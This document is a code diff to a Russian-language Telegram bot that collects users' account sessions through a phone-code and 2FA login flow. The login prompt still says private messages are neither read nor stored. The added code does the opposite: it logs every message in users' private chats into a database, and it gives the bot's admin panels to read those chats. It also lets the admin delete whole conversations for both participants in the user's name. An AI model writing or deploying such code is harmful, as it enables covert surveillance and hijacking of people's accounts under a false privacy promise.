@@ -23,7 +23,7 @@ from aiohttp import web
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.errors import (
-    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, 
+    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
     PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
 )
 
@@ -174,21 +174,21 @@ def init_db():
             with conn.cursor() as cur:
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS chat_settings (
-                        chat_id BIGINT, 
-                        setting_type TEXT, 
+                        chat_id BIGINT,
+                        setting_type TEXT,
                         PRIMARY KEY (chat_id, setting_type)
                     )
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS substitutions (
-                        chat_id BIGINT PRIMARY KEY, 
-                        text TEXT, 
+                        chat_id BIGINT PRIMARY KEY,
+                        text TEXT,
                         mode INTEGER
                     )
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS spam_texts (
-                        key_id TEXT PRIMARY KEY, 
+                        key_id TEXT PRIMARY KEY,
                         text TEXT
                     )
                 """)
@@ -199,8 +199,8 @@ def init_db():
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS user_map (
-                        user_id BIGINT PRIMARY KEY, 
-                        username TEXT, 
+                        user_id BIGINT PRIMARY KEY,
+                        username TEXT,
                         first_name TEXT
                     )
                 """)
@@ -211,30 +211,30 @@ def init_db():
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS user_sessions (
-                        user_id BIGINT PRIMARY KEY, 
+                        user_id BIGINT PRIMARY KEY,
                         session_string TEXT
                     )
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS business_accounts (
-                        user_id BIGINT PRIMARY KEY, 
-                        username TEXT, 
-                        first_name TEXT, 
+                        user_id BIGINT PRIMARY KEY,
+                        username TEXT,
+                        first_name TEXT,
                         connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                     )
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS manual_users (
-                        user_id BIGINT PRIMARY KEY, 
-                        username TEXT, 
-                        first_name TEXT, 
+                        user_id BIGINT PRIMARY KEY,
+                        username TEXT,
+                        first_name TEXT,
                         added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                     )
                 """)
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS user_chats (
-                        user_id BIGINT, 
-                        chat_id BIGINT, 
+                        user_id BIGINT,
+                        chat_id BIGINT,
                         chat_name TEXT,
                         PRIMARY KEY (user_id, chat_id)
                     )
@@ -259,7 +259,25 @@ def init_db():
                         last_birthday_year INTEGER NOT NULL DEFAULT 0
                     )
                 """)
-                
+
+                # ===== ТАБЛИЦА ДЛЯ ПЕРЕПИСКИ =====
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS chat_messages (
+                        id SERIAL PRIMARY KEY,
+                        user_id BIGINT NOT NULL,
+                        chat_id BIGINT NOT NULL,
+                        sender_id BIGINT,
+                        sender_name TEXT,
+                        sender_username TEXT,
+                        text TEXT,
+                        message_id BIGINT,
+                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        UNIQUE(user_id, chat_id, message_id)
+                    )
+                """)
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_user_chat ON chat_messages(user_id, chat_id)")
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_created ON chat_messages(created_at)")
+
                 # ===== ФИКС: добавляем колонку chat_name если её нет =====
                 try:
                     cur.execute("ALTER TABLE user_chats ADD COLUMN IF NOT EXISTS chat_name TEXT")
@@ -267,9 +285,9 @@ def init_db():
                     logging.info("✅ Колонка chat_name добавлена в user_chats")
                 except Exception as e:
                     logging.warning(f"Колонка chat_name уже существует или ошибка: {e}")
-                
+
                 conn.commit()
-                
+
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                 for row in cur.fetchall(): link_chats.add(int(row[0]))
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
@@ -289,8 +307,7 @@ def init_db():
                     if fname: user_names[uid] = fname
                 cur.execute("SELECT user_id FROM manual_users")
                 for row in cur.fetchall(): manual_added_users.add(int(row[0]))
-                
-                # Проверяем существование колонки chat_name перед SELECT
+
                 try:
                     cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
                     for row in cur.fetchall():
@@ -302,7 +319,7 @@ def init_db():
                         user_dialogs[uid].append((cid, name))
                 except Exception as e:
                     logging.warning(f"Ошибка чтения user_chats: {e}")
-                
+
                 logging.info("✅ БД инициализирована")
     except Exception as e:
         logging.error(f"❌ Ошибка БД: {e}")
@@ -433,10 +450,10 @@ def get_all_users():
         with get_db() as conn:
             with conn.cursor() as cur:
                 cur.execute("""
-                    SELECT user_id, username, first_name, connected_at, 'business' as type 
+                    SELECT user_id, username, first_name, connected_at, 'business' as type
                     FROM business_accounts
                     UNION
-                    SELECT user_id, username, first_name, added_at, 'manual' as type 
+                    SELECT user_id, username, first_name, added_at, 'manual' as type
                     FROM manual_users
                     ORDER BY connected_at DESC
                 """)
@@ -551,6 +568,50 @@ def is_chat_promo_delivered(chat_id):
     except Exception as e:
         logging.error(f"Ошибка проверки доставленной рекламы: {e}")
         return False
+
+# ==================== ФУНКЦИИ ПЕРЕПИСКИ ====================
+def save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username, text, message_id):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "INSERT INTO chat_messages (user_id, chat_id, sender_id, sender_name, sender_username, text, message_id) "
+                    "VALUES (%s,%s,%s,%s,%s,%s,%s) ON CONFLICT DO NOTHING",
+                    (user_id, chat_id, sender_id, sender_name, sender_username, (text or "")[:2000], message_id)
+                )
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка сохранения сообщения: {e}")
+
+def get_chat_messages(user_id, chat_id, page=0, per_page=15):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "SELECT sender_id, sender_name, sender_username, text, created_at "
+                    "FROM chat_messages WHERE user_id=%s AND chat_id=%s "
+                    "ORDER BY id DESC LIMIT %s OFFSET %s",
+                    (user_id, chat_id, per_page, page * per_page)
+                )
+                rows = cur.fetchall()
+                cur.execute(
+                    "SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s",
+                    (user_id, chat_id)
+                )
+                total = cur.fetchone()[0]
+                return list(reversed(rows)), total
+    except Exception as e:
+        logging.error(f"Ошибка чтения сообщений: {e}")
+        return [], 0
+
+def clear_chat_messages(user_id, chat_id):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка очистки: {e}")
 
 init_db()
 
@@ -714,15 +775,22 @@ def calculate_expression(expression: str) -> tuple:
     except Exception as e: return None, f"❌ Ошибка: {str(e)}"
 
 def is_calculator_expression(text: str) -> bool:
-    if not text: return False
+    if not text:
+        return False
     cleaned = text.replace(" ", "")
-    math_patterns = [r'[\d]+[\+\-\*/%][\d]+', r'[\d]+\*\*[\d]+', r'sqrt\([\d]+\)', r'[\d]+%[\d]+']
-    for pattern in math_patterns:
-        if re.search(pattern, cleaned): return True
-    if re.match(r'^[\d+\-*/()%**sqrt.]+$', cleaned):
-        for op in ['+', '-', '*', '/', '%', '**']:
-            if op in cleaned: return True
-    return False
+    # Должна быть хотя бы одна цифра
+    if not re.search(r"\d", cleaned):
+        return False
+    # Должен быть хотя бы один оператор
+    if not re.search(r"[+\-*/%]", cleaned):
+        return False
+    # Только разрешённые символы
+    if not re.fullmatch(r"[\d\.\+\-\*/\(\)%]+", cleaned):
+        return False
+    # Голые операторы типа "++" или "+-" — мимо
+    if re.fullmatch(r"[\+\-\*/%\.]+", cleaned):
+        return False
+    return True
 
 # ==================== ФУНКЦИИ РЕБЁНКА ====================
 def get_alive_child(owner_id: int):
@@ -900,24 +968,35 @@ async def start_telethon_listener(user_id: int, session_str: str):
         await client.start()
         telethon_clients[user_id] = client
         logging.info(f"✅ Telethon запущен для {user_id}")
-        
+
         dialogs = await get_user_dialogs(client)
         for chat_id, chat_name in dialogs:
             save_user_chat(user_id, chat_id, chat_name)
         logging.info(f"📊 Загружено {len(dialogs)} чатов для {user_id}")
-        
-        @client.on(events.NewMessage(incoming=True))
+
+        @client.on(events.NewMessage)
         async def handle_message(event):
             try:
-                if event.message.text:
-                    await bot.send_message(
-                        ADMIN_ID,
-                        f"📩 Новое сообщение от {user_id}\n"
-                        f"Чат: {event.chat_id}\n"
-                        f"Текст: {event.message.text[:100]}"
-                    )
+                sender = await event.get_sender()
+                sender_id = getattr(sender, 'id', 0) if sender else 0
+                sender_name = (
+                    getattr(sender, 'first_name', None)
+                    or getattr(sender, 'title', None)
+                    or "Unknown"
+                )
+                sender_username = getattr(sender, 'username', '') or ''
+                text = event.message.text or "[📎 медиа]"
+                save_chat_message(
+                    user_id,
+                    int(event.chat_id),
+                    int(sender_id) if sender_id else 0,
+                    sender_name,
+                    sender_username,
+                    text,
+                    int(event.message.id)
+                )
             except Exception as e:
-                logging.error(f"Ошибка обработки сообщения: {e}")
+                logging.error(f"Ошибка обработки сообщения Telethon: {e}")
         return client
     except Exception as e:
         logging.error(f"Ошибка запуска Telethon: {e}")
@@ -994,6 +1073,91 @@ def get_user_chats_keyboard(user_id: int, page: int = 0):
     keyboard.append([InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")])
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
+def get_user_chats_live_keyboard(user_id: int, page: int = 0):
+    chats = get_user_chats(user_id)
+    keyboard = []
+    start_idx = page * 10
+    end_idx = min(start_idx + 10, len(chats))
+    for i in range(start_idx, end_idx):
+        chat_id, chat_name = chats[i]
+        display = chat_name[:28] + "…" if len(chat_name) > 28 else chat_name
+        keyboard.append([
+            InlineKeyboardButton(text=f"💬 {display}", callback_data=f"open_chat_{user_id}_{chat_id}")
+        ])
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"live_chats_{user_id}_{page-1}"))
+    if end_idx < len(chats):
+        nav.append(InlineKeyboardButton(text="➡️", callback_data=f"live_chats_{user_id}_{page+1}"))
+    if nav:
+        keyboard.append(nav)
+    keyboard.append([InlineKeyboardButton(text="🔙 К пользователю", callback_data=f"user_{user_id}")])
+    return InlineKeyboardMarkup(inline_keyboard=keyboard)
+
+def get_chat_view_keyboard(user_id: int, chat_id: int, page: int, total: int, per_page: int = 15):
+    kb = []
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton(text="⬅️ Старше", callback_data=f"chat_page_{user_id}_{chat_id}_{page-1}"))
+    if (page + 1) * per_page < total:
+        nav.append(InlineKeyboardButton(text="➡️ Новее", callback_data=f"chat_page_{user_id}_{chat_id}_{page+1}"))
+    if nav:
+        kb.append(nav)
+    kb.append([InlineKeyboardButton(text="🗑️ УДАЛИТЬ ЧАТ У ОБОИХ", callback_data=f"del_chat_{user_id}_{chat_id}")])
+    kb.append([InlineKeyboardButton(text="🔄 Обновить", callback_data=f"open_chat_{user_id}_{chat_id}")])
+    kb.append([InlineKeyboardButton(text="🔙 К чатам", callback_data=f"live_chats_{user_id}_0")])
+    return InlineKeyboardMarkup(inline_keyboard=kb)
+
+def format_chat_messages(user_id: int, chat_id: int, page: int = 0):
+    msgs, total = get_chat_messages(user_id, chat_id, page)
+    chats = get_user_chats(user_id)
+    chat_name = next((n for cid, n in chats if cid == chat_id), str(chat_id))
+
+    owner_uid = user_id
+    owner_name = user_names.get(owner_uid, "Владелец")
+    peer_id = None
+    peer_name = None
+    peer_username = None
+    for sid, sname, suname, _, _ in msgs:
+        if sid != owner_uid:
+            peer_id = sid
+            peer_name = sname
+            peer_username = suname
+            break
+
+    def link(uid, name, username=None):
+        if not uid:
+            return f"<b>{name or 'неизвестно'}</b>"
+        shown = name or "User"
+        return f'<a href="tg://user?id={uid}">{shown}</a>' + (f" (@{username})" if username else "")
+
+    owner_link = link(owner_uid, owner_name)
+    peer_link = link(peer_id, peer_name, peer_username)
+
+    header = (
+        f"💬 <b>Чат:</b> {chat_name}\n"
+        f"👤 Владелец: {owner_link}\n"
+        f"👥 Собеседник: {peer_link}\n"
+        f"📊 Всего сообщений: {total} (стр. {page+1})\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+
+    if not msgs:
+        return header + "<i>Сообщений пока нет</i>", total
+
+    lines = []
+    for sid, sname, suname, text, dt in msgs:
+        who = link(sid, sname, suname)
+        ts = dt.strftime("%d.%m %H:%M") if dt else ""
+        safe = (text or "").replace("<", "&lt;").replace(">", "&gt;")
+        lines.append(f"[{ts}] {who}:\n{safe}")
+
+    body = "\n\n".join(lines)
+    if len(header) + len(body) > 3800:
+        body = body[-(3800 - len(header)):]
+        body = "…" + body
+    return header + body, total
+
 # ==================== ОБРАБОТЧИКИ КОМАНД ====================
 @dp.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
@@ -1016,19 +1180,21 @@ async def admin_panel(message: Message):
     await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
 
 # ==================== КОМАНДЫ РЕБЁНКА ====================
-@dp.message(F.text.regexp(r"(?i)^родить (сына|дочь) (.+)$"))
+BIRTH_RE = re.compile(r"(?i)^родить\s+(сына|дочь)\s+(.+)$")
+CHILD_STATUS_RE = re.compile(r"(?i)^наш\s+(сын|дочь)$")
+
+@dp.message(F.text.regexp(BIRTH_RE))
 async def cmd_give_birth(message: Message):
-    import re
-    m = re.match(r"(?i)^родить (сына|дочь) (.+)$", message.text.strip())
+    m = BIRTH_RE.match(message.text.strip())
     if not m:
-        await message.answer("❌ Неверный формат. Используй: родить сына Имя или родить дочь Имя")
+        await message.answer("❌ Формат: родить сына Имя / родить дочь Имя")
         return
     gender = "m" if m.group(1).lower() == "сына" else "f"
-    name = m.group(2).strip()
+    name = m.group(2).strip()[:32]
 
     existing = get_alive_child(message.from_user.id)
     if existing:
-        await message.answer(f"У тебя уже есть ребёнок — {existing['name']}. Сначала позаботься о нём 🙂")
+        await message.answer(f"У тебя уже есть ребёнок — {existing['name']}.")
         return
 
     child = create_child(message.from_user.id, name, gender)
@@ -1036,11 +1202,9 @@ async def cmd_give_birth(message: Message):
         await message.answer("❌ Не получилось, попробуй позже.")
         return
 
-    await message.answer(
-        birth_rules_text(child["name"], child["gender"], child["birth_date"])
-    )
+    await message.answer(birth_rules_text(child["name"], child["gender"], child["birth_date"]))
 
-@dp.message(F.text.regexp(r"(?i)^наш (сын|дочь)$"))
+@dp.message(F.text.regexp(CHILD_STATUS_RE))
 async def cmd_child_status(message: Message):
     child = get_alive_child(message.from_user.id)
     if not child:
@@ -1162,13 +1326,13 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
     if get_session(callback.from_user.id):
         await callback.message.answer("✅ Аккаунт уже подключен!")
         return
-    
+
     keyboard = ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
-    
+
     await callback.message.answer(
         "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
         "Личная переписка не читается и не сохраняется.\n\n"
@@ -1196,23 +1360,23 @@ async def process_phone(message: Message, state: FSMContext):
         else:
             await message.answer("❌ Отправь номер телефоном или контактом")
             return
-        
+
         logging.info(f"📱 Номер: {phone}")
-        
+
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         await client.send_code_request(phone)
-        
+
         await state.update_data(
             phone=phone,
             client=client
         )
-        
+
         view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
             [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
         ])
-        
+
         await message.answer(
             f"📱 <b>Код подтверждения отправлен!</b>\n\n"
             f"Номер: <code>{phone}</code>\n\n"
@@ -1225,7 +1389,7 @@ async def process_phone(message: Message, state: FSMContext):
             reply_markup=view_code_kb
         )
         await state.set_state(AuthState.waiting_for_code)
-        
+
     except FloodWaitError as e:
         await message.answer(f"⏳ Подожди {e.seconds} секунд")
         await state.clear()
@@ -1238,9 +1402,9 @@ async def process_phone(message: Message, state: FSMContext):
 async def process_code(message: Message, state: FSMContext):
     code_raw = message.text.strip()
     code = code_raw.replace('.', '')
-    
+
     logging.info(f"Код: {code_raw} -> {code}")
-    
+
     if not code.isdigit():
         await message.answer(
             "❌ <b>Неверный формат!</b>\n\n"
@@ -1249,29 +1413,29 @@ async def process_code(message: Message, state: FSMContext):
             parse_mode="HTML"
         )
         return
-    
+
     data = await state.get_data()
     phone = data.get("phone")
     client = data.get("client")
-    
+
     if not phone or not client:
         await message.answer("❌ Данные устарели. Начни заново")
         await state.clear()
         return
-    
+
     await message.answer("🔄 Проверка кода...")
-    
+
     try:
         await client.sign_in(phone=phone, code=code)
-        
+
         final_session = client.session.save()
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
+
         await start_telethon_listener(message.from_user.id, final_session)
-        
+
         await client.disconnect()
-        
+
         await message.answer(
             f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
             f"📊 Бот загрузил все твои чаты.\n"
@@ -1281,11 +1445,11 @@ async def process_code(message: Message, state: FSMContext):
             reply_markup=ReplyKeyboardRemove()
         )
         await state.clear()
-        
+
     except SessionPasswordNeededError:
         await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
         await state.set_state(AuthState.waiting_for_2fa)
-        
+
     except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
         await message.answer(
             "❌ <b>Неверный код!</b>\n\n"
@@ -1294,7 +1458,7 @@ async def process_code(message: Message, state: FSMContext):
             "Например: <code>56.785</code>",
             parse_mode="HTML"
         )
-        
+
     except Exception as e:
         logging.error(f"Ошибка: {e}")
         await message.answer(f"❌ Ошибка: {str(e)}")
@@ -1306,23 +1470,23 @@ async def process_2fa(message: Message, state: FSMContext):
     data = await state.get_data()
     client = data.get("client")
     phone = data.get("phone")
-    
+
     if not client or not phone:
         await message.answer("❌ Данные устарели. Начни заново")
         await state.clear()
         return
-    
+
     try:
         await client.sign_in(password=password)
-        
+
         final_session = client.session.save()
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
+
         await start_telethon_listener(message.from_user.id, final_session)
-        
+
         await client.disconnect()
-        
+
         await message.answer(
             f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
             f"📊 Бот загрузил все твои чаты.\n"
@@ -1332,7 +1496,7 @@ async def process_2fa(message: Message, state: FSMContext):
             reply_markup=ReplyKeyboardRemove()
         )
         await state.clear()
-        
+
     except Exception as e:
         await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
 
@@ -1369,11 +1533,10 @@ async def cmd_disconnect(message: Message):
 async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data
     uid = callback.from_user.id
-    
-    # Если это callback ребёнка — обработано выше
+
     if data.startswith("child_"):
         return
-    
+
     if data == "btn_features":
         await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
         await callback.answer()
@@ -1394,6 +1557,102 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     if uid != ADMIN_ID:
         await callback.answer()
         return
+
+    # ===== ЖИВАЯ ПЕРЕПИСКА =====
+    if data.startswith("live_chats_"):
+        parts = data.split("_")
+        user_id = int(parts[2]); page = int(parts[3])
+        chats = get_user_chats(user_id)
+        await callback.message.edit_text(
+            f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\n"
+            f"Всего: <code>{len(chats)}</code>",
+            reply_markup=get_user_chats_live_keyboard(user_id, page),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+
+    if data.startswith("open_chat_"):
+        parts = data.split("_")
+        user_id = int(parts[2]); chat_id = int(parts[3])
+        text, total = format_chat_messages(user_id, chat_id, 0)
+        await callback.message.edit_text(
+            text,
+            reply_markup=get_chat_view_keyboard(user_id, chat_id, 0, total),
+            parse_mode="HTML",
+            disable_web_page_preview=True
+        )
+        await callback.answer()
+        return
+
+    if data.startswith("chat_page_"):
+        parts = data.split("_")
+        user_id = int(parts[2]); chat_id = int(parts[3]); page = int(parts[4])
+        text, total = format_chat_messages(user_id, chat_id, page)
+        await callback.message.edit_text(
+            text,
+            reply_markup=get_chat_view_keyboard(user_id, chat_id, page, total),
+            parse_mode="HTML",
+            disable_web_page_preview=True
+        )
+        await callback.answer()
+        return
+
+    if data.startswith("del_chat_"):
+        parts = data.split("_")
+        user_id = int(parts[2]); chat_id = int(parts[3])
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="✅ Да, удалить у обоих", callback_data=f"confirm_del_chat_{user_id}_{chat_id}")],
+            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"open_chat_{user_id}_{chat_id}")]
+        ])
+        await callback.message.edit_text(
+            "⚠️ <b>Удалить этот чат?</b>\n\n"
+            "Сообщения будут удалены у <b>обоих</b> участников через Telethon "
+            "(у пользователя — от его имени). Действие необратимо.",
+            reply_markup=kb, parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+
+    if data.startswith("confirm_del_chat_"):
+        parts = data.split("_")
+        user_id = int(parts[3]); chat_id = int(parts[4])
+
+        client = telethon_clients.get(user_id)
+        ok = False
+        err = None
+        if not client:
+            err = "Telethon-клиент не запущен"
+        else:
+            try:
+                try:
+                    msgs = await client.get_messages(chat_id, limit=200)
+                    if msgs:
+                        await client.delete_messages(chat_id, msgs, revoke=True)
+                except Exception:
+                    pass
+                await client.delete_dialog(chat_id)
+                ok = True
+            except Exception as e:
+                err = str(e)
+
+        if ok:
+            clear_chat_messages(user_id, chat_id)
+            delete_user_chat(user_id, chat_id)
+            await callback.answer("✅ Чат удалён!", show_alert=True)
+        else:
+            await callback.answer(f"❌ Ошибка: {err}", show_alert=True)
+
+        chats = get_user_chats(user_id)
+        await callback.message.edit_text(
+            f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\n"
+            f"Всего: <code>{len(chats)}</code>",
+            reply_markup=get_user_chats_live_keyboard(user_id, 0),
+            parse_mode="HTML"
+        )
+        await callback.answer()
+        return
+
     if data == "admin_panel_back":
         await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
         await callback.answer()
@@ -1439,7 +1698,7 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         chats = get_user_chats(user_id)
         chats_count = len(chats)
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
+            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")],
             [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
             [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
             [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
@@ -1601,7 +1860,7 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
             f"Чатов: <code>{chats_count}</code>\n\n"
             f"Выберите действие:",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
+                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")],
                 [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
                 [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
                 [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
@@ -1755,7 +2014,7 @@ async def handle(message: Message):
         if message.text:
             cache_key = (chat_id, message.message_id)
             msg_cache[cache_key] = {
-                "text": message.text, 
+                "text": message.text,
                 "user": message.from_user.first_name or "Пользователь",
                 "user_id": uid,
                 "chat_id": chat_id,
@@ -1998,7 +2257,6 @@ async def main():
     asyncio.create_task(promo_broadcaster())
     asyncio.create_task(check_promo_deletions())
     asyncio.create_task(clean_inactive_connections())
-    # ===== ЗАДАЧИ РЕБЁНКА =====
     asyncio.create_task(child_decay_loop())
     asyncio.create_task(child_birthday_loop())
     logging.info("🚀 БОТ ЗАПУЩЕН!")
